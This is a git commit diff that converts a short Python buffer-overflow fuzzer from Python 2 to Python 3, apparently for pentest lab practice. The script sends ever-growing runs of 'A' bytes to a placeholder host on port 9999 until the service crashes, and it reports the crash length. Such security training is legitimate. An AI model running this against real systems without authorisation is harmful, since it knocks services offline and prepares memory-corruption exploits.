0e70935db132bb9e1b1fc4a93ee3d33f0d25b33d
ArchCWithClasses <86631513+ArchCWithClasses@users.noreply.github.com>
2022-02-03 18:02:45 -0600

    Update fuzzing.py

--- fuzzing.py
+++ fuzzing.py
@@ -1,23 +1,23 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
 
 import sys, socket 
 
 from time import sleep 
 
-buffer = "A" * 100
+buffer = b"A" * 100
 
 while True:
 	try:
 
 			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-			s.connect(("Machine IP", 9999))
+			s.connect(('Machine IP', 9999))
 
 			s.send((buffer))
 			s.close()
 			sleep(1)
-			buffer = buffer + "A"*100
+			buffer = buffer + b"A"*100
 
 	except:
 
-			print "Fuzzing crashed at %s bytes" % str(len(buffer))
+			print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
 			sys.exit()
